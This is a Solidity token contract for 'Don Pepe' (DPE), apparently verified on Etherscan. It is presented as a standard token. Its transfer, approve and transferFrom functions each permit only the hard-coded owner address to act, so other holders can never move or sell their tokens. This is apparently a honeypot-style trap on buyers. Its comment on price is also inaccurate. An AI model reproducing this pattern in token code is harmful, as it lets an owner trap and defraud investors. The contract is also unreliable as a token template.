/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

// SPDX-License-Identifier: MIT

// File: Donpepe.sol

pragma solidity ^0.8.0;

contract DonpepeToken {
    string public name = "Don Pepe";
    string public symbol = "DPE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 11000000 * (10 ** 18);
    address public owner = 0xFB89bf28C2dbA02E13843fCCE527B3fED59709EC;
    uint256 public price = 150 * (10 ** 18); //price is set to 1.50 as default in wei

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event PriceChange(uint256 newPrice);

    constructor() {
    balanceOf[owner] = totalSupply;
}

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value && value > 0 && msg.sender == owner);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value && value > 0 && msg.sender == owner);
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(balanceOf[from] >= value && allowance[from][msg.sender] >= value && value > 0 && msg.sender == owner);
        balanceOf[from] -= value;
        allowance[from][msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function setPrice(uint256 newPrice) public onlyOwner {
        price = newPrice;
        emit PriceChange(newPrice);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}